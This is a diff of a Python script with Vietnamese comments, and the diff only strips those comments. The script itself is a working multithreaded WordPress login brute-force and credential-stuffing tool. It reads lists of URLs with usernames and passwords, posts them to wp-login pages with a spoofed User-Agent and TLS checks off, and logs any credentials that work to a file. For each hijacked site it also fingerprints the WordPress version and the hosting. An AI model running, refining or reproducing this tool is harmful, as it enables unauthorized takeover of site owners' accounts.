@@ -11,17 +11,13 @@ from colorama import Fore, Style, init
 import socket
 from concurrent.futures import ThreadPoolExecutor
 
-# Khởi tạo colorama
 init(autoreset=True)
 
-# Tắt cảnh báo HTTPS không được xác minh
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Biến đếm số trang chiếm quyền thành công
 success_count = 0
 
 def log_message(message, level="INFO"):
-    """Hàm in ra thông tin với format cố định và màu sắc."""
     colors = {
         "INFO": Fore.CYAN + Style.BRIGHT,
         "SUCCESS": Fore.GREEN + Style.BRIGHT,
@@ -32,7 +28,6 @@ def log_message(message, level="INFO"):
     print(f"{colors.get(level, '')}{message}{colors['RESET']}")
 
 def save_success(target, username, password, version):
-    """Lưu thông tin đăng nhập thành công vào file success.txt."""
     global success_count
     try:
         with open("success.txt", "a", encoding="utf-8") as success_file:
@@ -42,22 +37,18 @@ def save_success(target, username, password, version):
         log_message(f"Lỗi khi lưu thông tin: {e}", "ERROR")
 
 def is_wordpress_login_page(target_url, timeout=10):
-    """Kiểm tra nếu URL dẫn tới trang đăng nhập WordPress hợp lệ."""
     try:
         response = requests.get(target_url, timeout=timeout, verify=False)
         
         if response.status_code != 200:
             return False
         
-        # Kiểm tra URL có chứa wp-login.php hoặc các từ khóa liên quan
         if "wp-login.php" not in response.url:
             return False
         
-        # Kiểm tra nếu có các trường đăng nhập đặc trưng của WordPress
         if not all(field in response.text for field in ['name="log"', 'name="pwd"', 'name="wp-submit"']): 
             return False
 
-        # Kiểm tra thêm các liên kết lostpassword và register
         if not any(link in response.text for link in ['lostpassword', 'register']):
             return False
         
@@ -66,21 +57,17 @@ def is_wordpress_login_page(target_url, timeout=10):
         return False
 
 def get_wordpress_version(session, target_url, timeout=10):
-    """Lấy phiên bản WordPress từ trang."""
     try:
         response = session.get(target_url, timeout=timeout, verify=False)
         if response.status_code == 200:
-            # Tìm phiên bản trong meta tag generator
             meta_match = re.search(r'<meta name="generator" content="WordPress ([^"]+)"', response.text, re.IGNORECASE)
             if meta_match:
                 return meta_match.group(1)
 
-            # Tìm phiên bản trong URL tài nguyên (wp-includes/js)
             script_match = re.search(r'wp-includes/.+?ver=([\d.]+)', response.text, re.IGNORECASE)
             if script_match:
                 return script_match.group(1)
 
-            # Kiểm tra phiên bản từ HTML comment
             comment_match = re.search(r'<!--.*?WordPress\s+([\d.]+).*?-->', response.text, re.IGNORECASE)
             if comment_match:
                 return comment_match.group(1)
@@ -89,7 +76,6 @@ def get_wordpress_version(session, target_url, timeout=10):
     return "Không rõ"
 
 def get_hosting_type(target_url):
-    """Kiểm tra loại hosting của website."""
     try:
         domain = re.sub(r"https?://", "", target_url).split('/')[0]
         ip_address = socket.gethostbyname(domain)
@@ -104,7 +90,6 @@ def get_hosting_type(target_url):
         return "Unknown"
 
 def check_login_success(response):
-    """Kiểm tra nếu đăng nhập thành công."""
     if "wp_logged_in" in response.cookies:
         return True
     if "wp-admin" in response.url or "dashboard" in response.text:
@@ -112,11 +97,9 @@ def check_login_success(response):
     return False
 
 def print_successful_login(target_url, username, password, version, hosting_type):
-    """In thông tin đăng nhập thành công ra màn hình với khung đẹp và màu sắc theo yêu cầu."""
     frame_width = 100
     content_width = frame_width - 4  # 2 cho '║ ' và 2 cho ' ║'
 
-    # Định nghĩa màu sắc cho từng mục
     colors = {
         "target": Fore.CYAN + Style.BRIGHT,       # Xanh nước biển
         "version": Fore.CYAN + Style.BRIGHT,      # Xanh nước biển
@@ -127,11 +110,9 @@ def print_successful_login(target_url, username, password, version, hosting_type
 
     def print_line(line, color_key=None):
         if color_key and color_key in colors:
-            # Tính độ dài thực sự của nội dung mà không tính các mã màu
             visible_length = len(line)
             padding_length = content_width - visible_length
             if padding_length < 0:
-                # Truncate nếu dòng quá dài
                 line = line[:content_width]
                 visible_length = len(line)
                 padding_length = 0
@@ -141,7 +122,6 @@ def print_successful_login(target_url, username, password, version, hosting_type
         else:
             print(f"║ {line.ljust(content_width)} ║")
 
-    # In khung
     print("╔" + "═" * (frame_width - 2) + "╗")
     print_line("➤ Kiểm tra mục tiêu:", "target")
     print_line(f"   {target_url[:content_width - 3]}", "target")
@@ -157,7 +137,6 @@ def print_successful_login(target_url, username, password, version, hosting_type
     print("╚" + "═" * (frame_width - 2) + "╝")
 
 def bruteforce(target_url, username, password, timeout, retries=3):
-    """Thực hiện brute-force trên một mục tiêu."""
     session = requests.Session()
     headers = {
         "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
@@ -165,16 +144,13 @@ def bruteforce(target_url, username, password, timeout, retries=3):
     }
     data = {"log": username, "pwd": password, "wp-submit": "Log In"}
 
-    # Kiểm tra URL WordPress
     if not is_wordpress_login_page(target_url, timeout):
         return
 
-    # Thực hiện brute-force
     for attempt in range(retries):
         try:
             response = session.post(target_url, data=data, headers=headers, timeout=timeout, verify=False)
             if check_login_success(response):
-                # Chỉ in ra khi đăng nhập thành công
                 version = get_wordpress_version(session, target_url, timeout)
                 hosting_type = get_hosting_type(target_url)
                 print_successful_login(target_url, username, password, version, hosting_type)
@@ -185,7 +161,6 @@ def bruteforce(target_url, username, password, timeout, retries=3):
         time.sleep(1)
 
 def file_reader(file_name):
-    """Đọc và phân tích file đầu vào."""
     try:
         with open(file_name, "r", encoding="utf-8") as f:
             targets = []
@@ -202,12 +177,10 @@ def file_reader(file_name):
         raise SystemExit(1)
 
 def run_bruteforce(targets, timeout):
-    """Chạy brute-force xử lý từng mục tiêu tuần tự."""
     with ThreadPoolExecutor(max_workers=50) as executor:
         executor.map(lambda target: bruteforce(*target, timeout), targets)
 
 def parse_args():
-    """Phân tích tham số dòng lệnh."""
     parser = argparse.ArgumentParser(description="Công cụ brute-force đăng nhập WordPress.")
     parser.add_argument("--target_file", required=True, help="File chứa danh sách URL:User:Pass")
     parser.add_argument("--timeout", type=int, default=10, help="Thời gian chờ mỗi yêu cầu (mặc định: 10 giây)")
